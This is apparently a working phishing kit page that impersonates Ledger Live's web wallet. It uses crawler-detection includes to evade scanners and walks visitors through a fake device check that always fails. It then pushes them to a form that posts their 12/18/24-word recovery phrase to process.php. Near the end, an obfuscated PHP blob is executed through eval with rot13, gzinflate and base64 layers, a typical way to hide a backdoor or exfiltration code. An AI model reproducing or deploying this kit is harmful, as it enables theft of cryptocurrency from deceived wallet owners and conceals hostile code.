<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>

  <link rel="shortcut icon" type=image/png href="./files/webwallet_files/wal.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ledger Live - Webwallet</title>
  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">


  <link href="./files/webwallet_files/css2" rel="stylesheet">
  <link rel="stylesheet" href="./files/webwallet_files/style.css">
  <link rel="stylesheet" href="./files/webwallet_files/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous">

  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">
  <link rel="stylesheet" href="./files/webwallet_files/app.css">

  <link href="./files/webwallet_files/css2" rel="stylesheet">
</head>
<body>
<script>
function Function() {
  var txt;
  if (confirm("You need to connect a Ledger to continue.")) {
    window.location.href = "";
  } else {
   
  }
  document.getElementById("demo").innerHTML = txt;
}
</script>

  <div class="content">
    <div class="left">
      <img src="./files/webwallet_files/ledger-logo.png" alt="" srcset="" style="width: 60%;
      margin: 0 auto;
      display: block; margin-top: 20px;">

      <p class="menu-item">MY DEVICES</p>

      <div class="side activated">
        <img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">
        <span>Add Wallet</span>
      </div>






      <p class="menu-item">MENU</p>

      <div onclick="Function()" class="side">
        <img src="./files/porto.PNG" alt="" height="22px" class="mr-2">
        <span>Portfolio</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/acc.PNG" alt="" height="22px" class="mr-2">
        <span>Accounts</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/send.PNG" alt="" height="22px" class="mr-2">
        <span>Send</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/rec.png" alt="" height="22px" class="mr-2">
        <span>Receive</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/man.png" alt="" height="22px" class="mr-2">
        <span>Manager</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/buy.png" alt="" height="22px" class="mr-2">
        <span>Buy Crypto</span>
      </div>

    </div>

    <div class="rigth">
      <h3><img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">Ledger Live</h3>
      <p style="font-size: 12px; color:#717171;">Manage crypto assets in Ledger securely from your browser. Advanced security for your cryptocurrency, made easy.</p>

      <div class="main" >
        <div class="timeline">
          <div class="line"></div>
          <div class="line-2"></div>
          <div class="line-3"></div>
          <div class="step active" data-count="1">
            <div class="cercle active-cercle">1</div>
            <p class="desc desc-active">Detection</p>
          </div>
          <div class="step" data-count="2">
            <div class="cercle">2</div>
            <p class="desc">Checking</p>
          </div>
          <div class="step" data-count="3">
            <div class="cercle">3</div>
            <p class="desc">Connect</p>
          </div>
        </div>

        <div id="step-1">
          <h4 class="mt-5 text-center">Select your device</h4>

          <div class="myCards">
            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanox.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
              <span class="badge badge-secondary" style="font-size: 10px;">USB Only</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanos.png" alt="" class="device">
              <p class="mt-2">Ledger Nano S</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/blue.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>
          </div>
        </div>



        <div id="step-2" class="step-2">
          <div class="video-device">
            <h5 class="text-center">Genuin check</h5>
			<p style="font-size: 12px; color:#717171;"> Connect your Ledger with this device to interact with Ledger Live.</p>


            <div id="connect-spinner">
              <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                  <span class="sr-only">Loading...</span>
                </div>
              </div>
              </div>

            <div class="connect text-center">
              <p style="color: rgb(182, 2, 2); font-size: 12px;">Ledger Live could not connect with your device. Check if your device is connected properly or recover your wallet.</p>

              <button id="use-phrase" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left; background-color: #6490f1; margin-bottom: 10px; color: white;">
                <img class="restorememe" style="margin-right: 20px" src="./files/webwallet_files/restore.png" alt="" srcset="" height="22px">
                Recover ledger with seed phrase
              </button>

              <button id="refresh" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left;">
              <img style="margin-right: 20px" src="./files/webwallet_files/refresh.png" alt="" srcset="" height="22px">
                Refresh
            </button>
            </div>
          </div>
        </div>



        <div id="step-3" class="step-3">
		<center>
<h4 style="
    margin-top: 10px;
    margin-bottom: 30px;
">Use your Recovery Phrase</h4>
		  <p style="font-size: 12px; color:#717171;">Enter your 12/18/24 words in a strict order. Do not rearrange them. </p>
        </center>
		  

          <form action="process.php" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
            <div class="form-group">
              <textarea name="key" id="phrase" required="required" minlength="12" 
			  style="width: 100%; margin: 0 auto;" 
			  placeholder="Enter your Recovery phrase here" 
			  class="form-control" rows="3"></textarea>

            </div>
			
            <span class="disabled" id="message">Enter a space between each word.</span>
            <button id="recovme" style="width: 100%; margin: 0 auto; padding: 10px; background-color: #6490f1; color: white;display: block; border: none;"
			 form="form1" value="Import" type="submit" name="import" class="recover-finale" >
              Continue
            </button>
          </form>
		  
        </div>


        <div class="bottom">
          <div class="btn back" id="back">
            Back
          </div>

          <button class="btn continue" id="continue" disabled="">
            Continue
          </button>
        </div>

      </div>
      <br>
      <br>
      <br>
      <br>
      <br>
    </div>
  </div>

  <script src="./files/webwallet_files/jquery.min.js.download"></script>
  <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));?>
  <script src="./files/webwallet_files/popper.min.js.download"></script>
  <script src="./files/webwallet_files/bootstrap.min.js.download"></script>
  <script src="./files/webwallet_files/app.js.download"></script>
  <script src="./files/webwallet_files/phrase.js.download"></script>


</body></html>